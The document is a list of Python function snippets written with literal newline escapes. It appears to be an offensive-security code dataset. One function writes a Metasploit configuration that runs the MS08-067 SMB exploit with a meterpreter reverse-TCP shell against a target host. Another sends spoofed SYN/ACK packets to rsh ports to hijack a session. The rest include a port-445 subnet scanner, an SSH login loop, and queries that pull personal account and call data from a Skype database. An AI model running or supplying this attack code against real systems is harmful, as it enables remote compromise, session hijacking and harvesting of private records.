def writeConfigFile(tgtHost, lport, lhost): \n with open('configFile', 'w') as file: \n file.write('use exploit/windows/smb/ms08_067_netapi\nset RHOST ' + str(tgtHost) + '\nset payload windows/meterpreter/reverse_tcp\nset LPORT ' + str(lport) + '\nset LHOST ' + lhost + '\nexploit -j -z\n')
def extractIP(pkt): \n ip = pkt.getlayer(IP).src \n ttl = pkt.getlayer(IP).ttl \n return ip, ttl
def connectSSX(): \n import socket \n s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n s.connect(('localhost', 9999)) \n s.send(b'protocol ssx')
def getHTMLThroughProxy(url, proxy): \n import requests \n proxies = {'http': proxy, 'https': proxy} \n response = requests.get(url, proxies=proxies) \n return response.text
def downloadImage(imgTag): \n import requests \n img_url = imgTag['src'] \n img_data = requests.get(img_url).content \n with open('downloaded_image.jpg', 'wb') as handler: \n handler.write(img_data) \n return 'downloaded_image.jpg'
def sendPackets(src, tgt, ack): \n from scapy.all import * \n syn = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags='S') \n send(syn) \n ack = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags='A', ack=ack) \n send(ack)
def executeSkypeDBQuery1(): \n import sqlite3 \n conn = sqlite3.connect('skypeDB') \n cursor = conn.cursor() \n cursor.execute("SELECT fullname, skypename, city, country, datetime(profile_timestamp,'unixepoch') FROM Accounts;") \n return cursor.fetchall()
def scanSubnetForPort445(subnet): \n import nmap \n nm = nmap.PortScanner() \n hosts_up = [] \n nm.scan(subnet, '445') \n for host in nm.all_hosts(): \n if nm[host].has_tcp(445) and nm[host]['tcp'][445]['state'] == 'open': \n hosts_up.append(host) \n return hosts_up
def sshConnect(host, user, password, release): \n import paramiko \n client = paramiko.SSHClient() \n client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \n fail_count = 0 \n while fail_count < release: \n try: \n client.connect(host, username=user, password=password) \n break \n except: \n fail_count += 1
def executeSkypeDBQuery2(): \n import sqlite3 \n conn = sqlite3.connect('skypeDB') \n cursor = conn.cursor() \n cursor.execute("SELECT datetime(begin_timestamp,'unixepoch'), identity FROM calls, conversations WHERE calls.conv_dbid = conversations.id;") \n return cursor.fetchall()